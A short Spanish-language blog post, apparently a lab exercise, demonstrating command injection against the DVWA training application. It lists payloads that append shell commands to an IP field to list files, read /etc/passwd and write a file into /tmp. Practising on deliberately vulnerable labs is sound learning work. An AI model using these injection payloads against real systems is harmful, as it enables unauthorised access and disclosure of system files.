---
typora-copy-images-to: ../assets/img/
typora-root-url: ../
layout: post
title:  "Command injection"
categories: jekyll update
---

## Comand injection

Realizaremos algunas injecciones de comandos en DVWA.

Listar ficheros:

`127.0.0.1; ls;`

![ci_ls](/assets/img/ci_ls.png)



Mostrar el contenido de passwd:

`127.0.0.1; cat /etc/passwd;`

![ci_passwd](/assets/img/ci_passwd.png)

<br>

Agregar un posible script en el directorio /tmp/:

`127.0.0.1; echo "posible script" > /tmp/prueba.sh;`

![ci_script](/assets/img/ci_script.png)

<br>

`172.0.0.1; cat /tmp/prueba.sh`



![ci_script2](/assets/img/ci_script2.png)